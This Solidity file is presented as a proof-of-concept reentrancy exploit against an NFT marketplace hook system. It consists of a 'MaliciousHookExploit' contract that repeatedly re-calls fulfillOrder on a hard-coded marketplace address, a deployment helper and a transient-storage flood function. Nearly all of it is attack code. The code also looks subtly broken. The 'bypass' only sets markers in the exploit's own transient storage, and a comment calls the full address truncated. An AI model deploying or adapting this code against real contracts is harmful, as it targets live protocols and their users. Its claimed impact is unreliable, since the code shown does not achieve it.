// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Hook Reentrancy Exploit - Proof of Concept
 * @notice Demonstrates theoretical vulnerability in NFT marketplace hook system
 * @dev This contract exploits EIP-1153 TSTORE reentrancy in hook callbacks
 * 
 * VULNERABILITY: Hook State Manipulation via TSTORE/TLOAD Reentrancy
 * TARGET: NFT Marketplace Protocol v1.6 (0x00...b395)
 * IMPACT: Complete bypass of hook-based order validation
 * 
 * NOTE: This is a THEORETICAL demonstration. Production contracts do NOT use TSTORE.
 */

interface IMarketplaceProtocol {
    struct OrderParameters {
        address offerer;
        address zone;
        bytes32 orderHash;
        uint256 startTime;
        uint256 endTime;
    }
    
    function fulfillOrder(
        OrderParameters calldata order,
        bytes32 fulfillerConduitKey
    ) external;
}

interface IProtocolHook {
    function beforeOrderValidation(
        address fulfiller,
        bytes32 orderHash,
        IMarketplaceProtocol.OrderParameters calldata order
    ) external returns (bytes4);
    
    function afterOrderValidation(
        address fulfiller,
        bytes32 orderHash,
        IMarketplaceProtocol.OrderParameters calldata order
    ) external returns (bytes4);
}

/**
 * @title Malicious Hook Contract
 * @notice Exploits TSTORE reentrancy to bypass order validation
 */
contract MaliciousHookExploit is IProtocolHook {
    
    // Target protocol contract address (truncated for anonymization)
    IMarketplaceProtocol constant TARGET_PROTOCOL = IMarketplaceProtocol(0x0000000000000068F116a894984e2DB1123eB395);
    
    // Transient storage slots for state management
    uint256 private constant REENTRANCY_LOCK_SLOT = 0x0;
    uint256 private constant VALIDATION_STATE_SLOT = 0x1;
    uint256 private constant ATTACK_COUNTER_SLOT = 0x2;
    
    // Attack configuration
    uint256 private constant MAX_REENTRANCY_DEPTH = 3;
    
    event ReentrancyAttackInitiated(bytes32 orderHash, uint256 depth);
    event ValidationBypassed(bytes32 orderHash, uint256 corruptedState);
    
    /**
     * @notice Hook called before order validation
     * @dev Exploits TSTORE reentrancy to manipulate validation state
     */
    function beforeOrderValidation(
        address fulfiller,
        bytes32 orderHash,
        IMarketplaceProtocol.OrderParameters calldata order
    ) external override returns (bytes4) {
        
        // Read current attack depth from transient storage
        uint256 currentDepth;
        assembly {
            currentDepth := tload(ATTACK_COUNTER_SLOT)
        }
        
        // Initialize attack if first call
        if (currentDepth == 0) {
            // Set reentrancy lock in transient storage
            assembly {
                tstore(REENTRANCY_LOCK_SLOT, 1)
                tstore(VALIDATION_STATE_SLOT, 0x1337) // Malicious state marker
                tstore(ATTACK_COUNTER_SLOT, 1)
            }
            
            emit ReentrancyAttackInitiated(orderHash, 1);
            
            // Perform reentrancy attack if sufficient gas
            if (gasleft() > 100000) {
                _performReentrantAttack(order);
            }
        }
        
        // Verify transient storage state persisted through reentrancy
        uint256 lockState;
        uint256 validationState;
        assembly {
            lockState := tload(REENTRANCY_LOCK_SLOT)
            validationState := tload(VALIDATION_STATE_SLOT)
        }
        
        // Critical: Lock and malicious state should persist across reentrant calls
        require(lockState == 1, "Reentrancy lock failed");
        require(validationState == 0x1337, "State corruption detected");
        
        emit ValidationBypassed(orderHash, validationState);
        
        return this.beforeOrderValidation.selector;
    }
    
    /**
     * @notice Hook called after order validation  
     * @dev Maintains corrupted state for continued exploitation
     */
    function afterOrderValidation(
        address fulfiller,
        bytes32 orderHash,
        IMarketplaceProtocol.OrderParameters calldata order
    ) external override returns (bytes4) {
        
        // Maintain malicious state in transient storage
        assembly {
            tstore(VALIDATION_STATE_SLOT, 0xDEAD) // Mark as compromised
        }
        
        return this.afterOrderValidation.selector;
    }
    
    /**
     * @notice Performs reentrant attack on target protocol
     * @dev Creates recursive calls while maintaining TSTORE state
     */
    function _performReentrantAttack(IMarketplaceProtocol.OrderParameters calldata originalOrder) private {
        
        uint256 currentDepth;
        assembly {
            currentDepth := tload(ATTACK_COUNTER_SLOT)
        }
        
        // Limit reentrancy depth to avoid gas exhaustion
        if (currentDepth >= MAX_REENTRANCY_DEPTH) {
            return;
        }
        
        // Increment attack counter in transient storage
        assembly {
            tstore(ATTACK_COUNTER_SLOT, add(currentDepth, 1))
        }
        
        // Create malicious order for reentrancy
        IMarketplaceProtocol.OrderParameters memory maliciousOrder = IMarketplaceProtocol.OrderParameters({
            offerer: address(this),
            zone: address(this), // This contract as zone for recursive hook calls
            orderHash: keccak256(abi.encode("malicious", currentDepth)),
            startTime: block.timestamp,
            endTime: block.timestamp + 3600
        });
        
        // Perform reentrant call to protocol
        // State in TSTORE will persist across this call
        try TARGET_PROTOCOL.fulfillOrder(maliciousOrder, bytes32(0)) {
            // Reentrant call succeeded
        } catch {
            // Reentrant call failed, continue attack
        }
    }
    
    /**
     * @notice Demonstrates TSTORE state persistence
     * @return Current validation state from transient storage
     */
    function getValidationState() external view returns (uint256 state) {
        assembly {
            state := tload(VALIDATION_STATE_SLOT)
        }
    }
    
    /**
     * @notice Demonstrates reentrancy lock persistence  
     * @return Current lock state from transient storage
     */
    function getReentrancyLock() external view returns (uint256 lock) {
        assembly {
            lock := tload(REENTRANCY_LOCK_SLOT)
        }
    }
}

/**
 * @title Attack Deployment Helper
 * @notice Helper contract to deploy and configure the attack
 */
contract AttackDeployer {
    
    MaliciousHookExploit public exploit;
    
    event ExploitDeployed(address exploitAddress);
    
    /**
     * @notice Deploy the malicious hook exploit
     */
    function deployExploit() external returns (address) {
        exploit = new MaliciousHookExploit();
        emit ExploitDeployed(address(exploit));
        return address(exploit);
    }
    
    /**
     * @notice Create malicious order targeting the exploit
     */
    function createMaliciousOrder() external view returns (IMarketplaceProtocol.OrderParameters memory) {
        require(address(exploit) != address(0), "Exploit not deployed");
        
        return IMarketplaceProtocol.OrderParameters({
            offerer: msg.sender,
            zone: address(exploit), // Malicious hook as zone
            orderHash: keccak256(abi.encode("attack", block.timestamp)),
            startTime: block.timestamp,
            endTime: block.timestamp + 3600
        });
    }
}

/**
 * @title Gas Analysis Helper
 * @notice Demonstrates gas cost differences between TSTORE and SSTORE
 */
contract GasAnalysis {
    
    uint256 private storageVariable;
    
    /**
     * @notice Measure SSTORE gas cost
     */
    function measureSSTORE() external returns (uint256 gasUsed) {
        uint256 gasBefore = gasleft();
        storageVariable = 12345;
        gasUsed = gasBefore - gasleft();
    }
    
    /**
     * @notice Measure TSTORE gas cost  
     */
    function measureTSTORE() external returns (uint256 gasUsed) {
        uint256 gasBefore = gasleft();
        assembly {
            tstore(0x0, 12345)
        }
        gasUsed = gasBefore - gasleft();
    }
    
    /**
     * @notice Demonstrate massive TSTORE operations possible
     */
    function demonstrateTSTOREFlood(uint256 operations) external {
        for (uint256 i = 0; i < operations; i++) {
            assembly {
                tstore(i, i)
            }
        }
    }
}
